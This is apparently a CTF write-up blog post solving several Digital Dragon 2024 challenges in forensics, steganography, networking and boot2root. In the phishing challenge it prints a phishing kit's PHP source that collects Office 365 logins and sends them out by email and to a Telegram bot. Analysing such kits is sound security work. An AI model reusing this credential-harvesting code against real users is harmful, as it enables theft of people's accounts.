---
layout: post
title:  "Digital Dragon CTFs"
tags: [Forensics]
date:   2024-08-12 00:00:00
excerpt: "Digitals Dragon CTFs 2024 Qualification"
feature: https://raw.githubusercontent.com/raviyelna/raviyelna.github.io/master/assets/img/background.jpg
categories: CTFs
comments: true
---
# Digital Dragon CTFs
## Solved by Raviel 
### Misc
#### Phising-1
![image](https://hackmd.io/_uploads/ryzw-bBcC.png)

The challenge gave us a link lead to a website.
![image](https://hackmd.io/_uploads/rksh-Wr9R.png)

After messing around I found that when I login with gmail its send me back to google.com

![image](https://hackmd.io/_uploads/rkMzfbrcA.png)

after checking its subfolder/path with Dirsearch I found a backup folder

![image](https://hackmd.io/_uploads/BkAcfWHcA.png)
![image](https://hackmd.io/_uploads/Syi3zZBcA.png)

Download the onedrive.zip file we got the source code of its
```
<?php

include '../email.php';

// Generate a unique session data
$data = base64_encode(time() . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . md5(uniqid(rand(), true)));
$_SESSION['data'] = $data;

// Prepare form data
$form = "**Office 365 Login Attempt**\n";
$form .= "| Username: " . $_POST['email'] . "\n";
$form .= "| Password: " . $_POST['password'] . "\n";
$form .= "| User IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$form .= "| Browser: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$form .= "| DateTime: " . date('Y-m-d H:i:s') . "\n";
$form .= "----------------------------------------\n";

// Prepare email details
$subject = "**Office 365 Login Attempt** From " . $_SERVER['REMOTE_ADDR'];
$headers = "From: Digital Dragons 2024 <your-email@example.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Send email to each recipient in $email array
foreach ($email as $recipient) {
    mail($recipient, $subject, $form, $headers);
}

// Send form data to Telegram
$data = [
    'chat_id' => $telegramID,
    'text' => $form
];
$response = file_get_contents("https://api.telegram.org/bot$telegramTOKEN/sendMessage?" . http_build_query($data));

// Redirect or display success message after processing
header(""); // Replace with your success page URL
exit();

?>

```
we can see that its send victim information back through a telegram bot using API token 

![image](https://hackmd.io/_uploads/rykuXWScC.png)

checking the token we got the flag in email.php

![image](https://hackmd.io/_uploads/Hyjj7-S5C.png)

**flag{227de24c5e70d582e1cfecb1c57105ff}**

---

### Forensics
#### Forensics-101

![453575658_784816443731120_1615205164487708797_n](https://hackmd.io/_uploads/SJAs4-BqC.png)

The challenge gave us a execute file but its seem not to be a right extension or format checking with file in Linux we see that its a PNG image so just change the extension back and got the flag

![image](https://hackmd.io/_uploads/HyJxHWr9A.png)

**Flag: flag{6203b09fa1b624c6aa627d6108544686}**

#### Log flood
![image](https://hackmd.io/_uploads/HJB6BWS9A.png)

The chall gave us a iso file extract it has alots of folder and log file 
![image](https://hackmd.io/_uploads/SyZO8WB9C.png)

the best way to solve this is to unzip it all then strings and grep or you can read it but it will be enourmous of text.

![image](https://hackmd.io/_uploads/BJFaw-r9C.png)
![image](https://hackmd.io/_uploads/B1pXOWBqC.png)

You will see a suspicious Base64 string decode it and got the flag
**Flag: flag{ab0d215c26354bfe02302c3beac879bf}**

#### Email
**SORRY I DONT HAVE THE CHALLENGE DESCRIPTION FOR THIS 'CAUSE I DIDN'T CAPTURE IT WHEN SOLVING AND THE WEBSITE ALREADY CLOSED**
![GR_yJ9QXsAA8L5R](https://hackmd.io/_uploads/B1eNYZBqC.png)

The challenge gave us a EML file, so I will open it with thunderbird

![image](https://hackmd.io/_uploads/HJR2F-H5R.png)

After messing around with the pdf file, its a corrupted file or its may be full of garbages inside

![image](https://hackmd.io/_uploads/rkpu5bBc0.png)

but do you remember the flag base64 encoded? its "ZmxhZw" do you see its familiar? its the picture right at the end of the EML file

![image](https://hackmd.io/_uploads/BJzAqWB50.png)
![image](https://hackmd.io/_uploads/B1VWj-H90.png)

**Flag: flag{743cd9316bb1ded417574643e3839737}**

---

### Stegnography

#### Steg-basic

![image](https://hackmd.io/_uploads/rJHOsWB9R.png)
![basic-steg](https://hackmd.io/_uploads/Hy4Zh-Bq0.jpg)

The challenge gave us a jpg picture, string it and got the flag

![image](https://hackmd.io/_uploads/HJLBn-B5A.png)

**Flag: flag{b666cd2bbfe773ea854948d9b77953ac}**

#### Steg-revised
![image](https://hackmd.io/_uploads/BywlaWBcR.png)

The challenge gave us a wav file and hint that its relate to LSB so I will check the file with Silenteye tool 

![image](https://hackmd.io/_uploads/Ski2aZB5A.png)

It return nothing I will have to write a script to decrypt it
```
import wave

song = wave.open("stego_audio_LSB.wav", mode='rb')
frame_bytes = bytearray(list(song.readframes(song.getnframes())))

# Extract the LSB of each byte
extracted = [frame_bytes[i] & 1 for i in range(len(frame_bytes))]
# Convert byte array back to string
string = "".join(chr(int("".join(map(str,extracted[i:i+8])),2)) for i in range(0,len(extracted),8))
decoded = string.split("###")[0]


print("decoded: "+decoded)
song.close()
```
![image](https://hackmd.io/_uploads/rkCd0bS5C.png)

**Flag: flag{464cb8f40278b7aafc98d931e50a5021}**

---

### Networking
#### D1 Accidental Breach

![image](https://hackmd.io/_uploads/rJJa0bHcC.png)

The challenge gave us a pcap file its contain 270 packets 

![image](https://hackmd.io/_uploads/r1EHyfScC.png)

going through the stream eventually you will find a conversation kinda suspicious 

![image](https://hackmd.io/_uploads/B11q1zS5R.png)
![image](https://hackmd.io/_uploads/SJBpkfr5C.png)

**Flag: flag{f88e05cbd53f00f6090be0e153680b2e}**

->***I wont be writting the first challenge cause its just ask what is "IoC" mean lmao***<-

---
### Boot2Root
#### BRT-1
**AGAIN IM SORRY BECAUSE I DON'T HAVE THE CHALLENGE DESCRIPTION**
The challenge gave us a ova file, open it in Vmware you can boot up a Vmware but there's no password and account, there 2 ways to solve this challenge.
![image](https://hackmd.io/_uploads/S1RNGMSqC.png)

First is we have to climb Root but in this case because the challenge gave us the whole VM so there is a Forensics way to solve it by using FTK imager.

![image](https://hackmd.io/_uploads/B1V3GGr5C.png)

add the vmdk file as image evidence and there we go

![image](https://hackmd.io/_uploads/Hkf1QzS5A.png)

Dig a little bit deeper and you will find the flag

![image](https://hackmd.io/_uploads/S1LWmMBcA.png)

**Flag: flag{2991c9c5a7e497203de318897dbf1970}**
**By the way, shout-out to AnhShidou for this unintended solve**

![image](https://hackmd.io/_uploads/rksRNMHcA.png)


**Thanks for reading (')>**


